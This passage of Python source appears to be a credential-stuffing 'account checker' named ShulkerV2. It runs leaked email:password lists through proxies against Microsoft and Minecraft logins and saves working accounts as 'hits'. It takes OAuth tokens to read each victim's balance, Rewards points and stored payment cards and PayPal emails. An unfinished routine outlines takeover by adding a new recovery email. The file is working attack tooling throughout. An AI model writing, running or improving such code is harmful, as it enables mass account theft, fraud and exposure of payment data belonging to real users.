            nonlocal result
            result = "unbanned"

        connection.connect()
        c = 0
        while result is None and c < 1000:
            time.sleep(0.01)
            c += 1

        if result == "unbanned":
            print(Fore.GREEN + f"[UNBANNED] {combo} | Logged in as {mc_name}" + Style.RESET_ALL)
            save_result(folder, "Donut_Unbanned.txt", f"{combo} | {mc_name}")
            if config.getboolean("Settings", "SaveCapture"):
                cap = Capture(email, password, mc_name, "unbanned", "", "", "")
                save_result(folder, "Capture.txt", cap.builder())
            time.sleep(1)
        elif result == "banned":
            if disconnect_message:
                clean = re.sub(r'§.', '', disconnect_message)
                # Try to extract reason, time left, ban id
                reason_match = re.search(r'(You are .+?)(?:\\n|\n|$)', clean)
                reason = reason_match.group(1).strip() if reason_match else "banned (unknown reason)"
                time_match = re.search(r'Time Left: ([^\n\\]+)', clean)
                time_left = time_match.group(1).strip() if time_match else ""
                banid_match = re.search(r'Ban ID: ([^\n\\]+)', clean)
                ban_id = banid_match.group(1).strip() if banid_match else ""
                fields = [reason, f"Time Left: {time_left}" if time_left else "", f"Ban ID: {ban_id}" if ban_id else ""]
                output = '.'.join([f for f in fields if f])
                print(Fore.RED + f"[BANNED] {combo} | Logged in as {mc_name} | Status: {output}" + Style.RESET_ALL)
                save_result(folder, "Donut_Banned.txt", f"{combo} | {mc_name} | {output}")
                if config.getboolean("Settings", "SaveCapture"):
                    cap = Capture(email, password, mc_name, "banned", reason, time_left, ban_id)
                    save_result(folder, "Capture.txt", cap.builder())
            else:
                print(Fore.RED + f"[BANNED] {combo} | Logged in as {mc_name} | Status: banned (no message)" + Style.RESET_ALL)
                save_result(folder, "Donut_Banned.txt", f"{combo} | {mc_name} | Status: banned (no message)")
        else:
            print(Fore.RED + f"[BAD] {combo} | Status: unknown error" + Style.RESET_ALL)
            save_result(folder, "Bad.txt", f"{combo} | Status: unknown error")
        connection.disconnect()
    except Exception as e:
        error_str = str(e)
        # Special handling for too many requests
        if "429" in error_str or "Too Many Requests" in error_str:
            print(Fore.RED + f"[BAD] {combo} | Status: too many requests" + Style.RESET_ALL)
            save_result(folder, "Bad.txt", f"{combo} | Status: too many requests")
        else:
            print(Fore.RED + f"[BAD] {combo} | Status: error | {error_str}" + Style.RESET_ALL)
            save_result(folder, "Bad.txt", f"{combo} | Status: error | {error_str}")
        time.sleep(0.1)

class MicrosoftAccountChecker:
    def __init__(self, session, config):
        self.session = session
        self.config = config
        self.timeout = config.get('general.timeout', 15)
    
    def check_all(self, email, password):
        """Check all Microsoft features"""
        result = {}
        
        if self.config.get('checkers.check_ms_balance'):
            result['balance'] = self._check_balance()
        
        if self.config.get('checkers.check_ms_rewards'):
            result['rewards_points'] = self._check_rewards()
        
        if self.config.get('checkers.check_payment_methods'):
            result['payment_methods'] = self._check_payment()
        
        return result
    
    def _check_balance(self):
        """Check Microsoft account balance"""
        try:
            # Get auth token
            token = self._get_payment_token()
            if not token:
                return None
            
            headers = {
                'Authorization': f'MSADELEGATE1.0={token}',
                'Accept': 'application/json'
            }
            
            response = self.session.get(
                'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx',
                headers=headers,
                timeout=self.timeout
            )
            
            if response.status_code == 200:
                balance_match = re.search(r'"balance":(\d+\.?\d*)', response.text)
                if balance_match:
                    return balance_match.group(1)
        except:
            pass
        return None
    
    def check_rewards_points(self):
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Pragma': 'no-cache', 'Accept': '*/*'}
            r = self.session.get('https://rewards.bing.com/', headers=headers, timeout=int(self.config.get('timeout', 10)))
            if 'action="https://rewards.bing.com/signin-oidc"' in r.text or 'id="fmHF"' in r.text:
                action_match = re.search('action="([^"]+)"', r.text)
                if action_match:
                    action_url = action_match.group(1)
                    data = {}
                    for input_match in re.finditer('<input type="hidden" name="([^"]+)" id="[^"]+" value="([^"]+)">', r.text):
                        data[input_match.group(1)] = input_match.group(2)
                    r = self.session.post(action_url, data=data, headers=headers, timeout=int(self.config.get('timeout', 10)))
            all_matches = re.findall(',"availablePoints":(\\d+)', r.text)
            if all_matches:
                points = max(all_matches, key=int)
                if points != '0':
                    return points
            headers_home = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Referer': 'https://www.bing.com/', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'}
            self.session.get('https://www.bing.com/', headers=headers_home, timeout=15)
            ts = int(time.time() * 1000)
            flyout_url = f'https://www.bing.com/rewards/panelflyout/getuserinfo?timestamp={ts}'
            headers_flyout = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Accept-Encoding': 'identity', 'Referer': 'https://www.bing.com/', 'X-Requested-With': 'XMLHttpRequest'}
            r_flyout = self.session.get(flyout_url, headers=headers_flyout, timeout=15)
            if r_flyout.status_code == 200:
                try:
                    data = r_flyout.json()
                    if data.get('userInfo', {}).get('isRewardsUser'):
                        balance = data.get('userInfo', {}).get('balance')
                        return str(balance)
                except ValueError:
                    pass
            return None
        except Exception:
            return None
    
    def _check_payment(self):
        """Check payment methods"""
        try:
            token = self.get_auth_token('000000000004773A', 'PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete', 'https://account.microsoft.com/auth/complete-silent-delegate-auth')
            if not token:
                return []
            headers = {'Authorization': f'MSADELEGATE1.0={token}', 'Accept': 'application/json'}
            r = self.session.get('https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-GB', headers=headers, timeout=15)
            instruments = []
            if r.status_code == 200:
                try:
                    data = r.json()
                    for item in data:
                        if 'paymentMethod' in item:
                            pm = item['paymentMethod']
                            family = pm.get('paymentMethodFamily')
                            type_ = pm.get('paymentMethodType')
                            if family == 'credit_card':
                                last4 = pm.get('lastFourDigits', 'N/A')
                                expiry = f"{pm.get('expiryMonth', '')}/{pm.get('expiryYear', '')}"
                                instruments.append(f'CC: {type_} *{last4} ({expiry})')
                            elif family == 'paypal':
                                email = pm.get('email', 'N/A')
                                instruments.append(f'PayPal: {email}')
                except:
                    pass
            return instruments
        except Exception:
            return []
    
    def _get_payment_token(self):
        """Get payment authorization token"""
        try:
            response = self.session.get(
                'https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read&redirect_uri=https://account.microsoft.com/auth/complete-silent-delegate-auth',
                timeout=self.timeout
            )
            
            from urllib.parse import urlparse, parse_qs
            token = parse_qs(urlparse(response.url).fragment).get('access_token', ['None'])[0]
            return token if token != 'None' else None
        except:
            return None

class SecurityChecker:
    def __init__(self, session, config):
        self.session = session
        self.config = config
    
    def check(self):
        """Check account security status"""
        # This would check for 2FA, security info, etc.
        # Simplified version
        return {
            'has_2fa': False,
            'has_email_access': False
        }

class AutoMarkLost:
    def __init__(self, config):
        self.config = config
        self.enabled = config.get('automation.auto_mark_lost', False)
        self.email_file = config.get('automation.notletters_email_file', 'notletters_emails.txt')
        self.api_key = config.get('automation.notletters_api_key', '')
        self.emails = self._load_emails()
    
    def _load_emails(self):
        """Load NotLetters emails"""
        try:
            with open(self.email_file, 'r') as f:
                emails = []
                for line in f:
                    if ':' in line:
                        email, password = line.strip().split(':', 1)
                        emails.append({'email': email, 'password': password})
                return emails
        except:
            return []
    
    def execute(self, email, password, minecraft_data):
        """Execute auto mark lost"""
        if not self.enabled or not self.emails:
            return None
        
        if not minecraft_data.get('minecraft_java_owned'):
            return {'success': False, 'reason': 'No Java Edition'}
        
        # Get random NotLetters email
        import random
        recovery_email = random.choice(self.emails)
        
        # This is a simplified version
        # Full implementation would:
        # 1. Login to Microsoft account
        # 2. Navigate to security settings
        # 3. Add recovery email
        # 4. Verify with NotLetters API
        
        return {
            'success': False,
            'reason': 'Feature requires full implementation',
            'new_recovery_email': recovery_email['email']
        }

def main():
    """Main entry point"""
    print(LOGO)
    logger.info("Starting ShulkerV2 Checker...")
    
    try:
        # Load config
        config = ConfigLoader('config.ini')
        logger.info("✓ Configuration loaded")
        
        # Initialize UI
        ui = UIManager(config)
        
        # Load combos
        combo_file = config.get('general.combo_file', 'combos.txt')
        if not os.path.exists(combo_file):
            logger.error(f"Combo file not found: {combo_file}")
            logger.error("Create combos.txt with email:password format")
            input("\nPress Enter to exit...")
            return
        
        # Initialize checker engine
        checker = CheckerEngine(config, ui)
        
        # Load combos and proxies
        combos = checker.load_combos(combo_file)
        if not combos:
            logger.error("No valid combos loaded!")
            input("\nPress Enter to exit...")
            return
        
        logger.info(f"✓ Loaded {len(combos)} combos")
        
        # Load proxies if enabled
        if config.get('proxies.enabled', False):
            proxy_file = config.get('proxies.file', 'proxies.txt')
            if os.path.exists(proxy_file):
                checker.load_proxies(proxy_file)
            else:
                logger.warning(f"Proxy file not found: {proxy_file}")
                logger.warning("Continuing in proxyless mode")
        
        # Start UI update thread
        ui_thread = threading.Thread(target=ui.update_loop, daemon=True)
        ui_thread.start()
        
        # Start checking
        logger.info("\n" + "="*80)
        logger.info("STARTING ACCOUNT CHECKING")
        logger.info("="*80 + "\n")
        
        checker.start_checking(combos)
        
        # Wait for completion
        checker.wait_for_completion()
        
        # Show final results
        logger.info("\n" + "="*80)
        logger.info("CHECKING COMPLETE")
        logger.info("="*80)
        
        stats = checker.get_stats()
        logger.info(f"""
Final Statistics:
  Total Checked: {stats['checked']}/{stats['total']}
  Hits: {stats['hits']}
  Bad: {stats['bad']}
  2FA: {stats['2fa']}
  MFA: {stats['mfa']}
  SFA: {stats['sfa']}
  XGP: {stats['xgp']}
  XGPU: {stats['xgpu']}
  Errors: {stats['errors']}
  
Results saved to: {checker.session_folder}
        """)
        
    except KeyboardInterrupt:
        logger.warning("\n\nStopping checker (Ctrl+C pressed)...")
        if 'checker' in locals():
            checker.stop()
    except Exception as e:
        logger.error(f"Fatal error: {e}", exc_info=True)
    finally:
        input("\nPress Enter to exit...")


if __name__ == "__main__":
    main()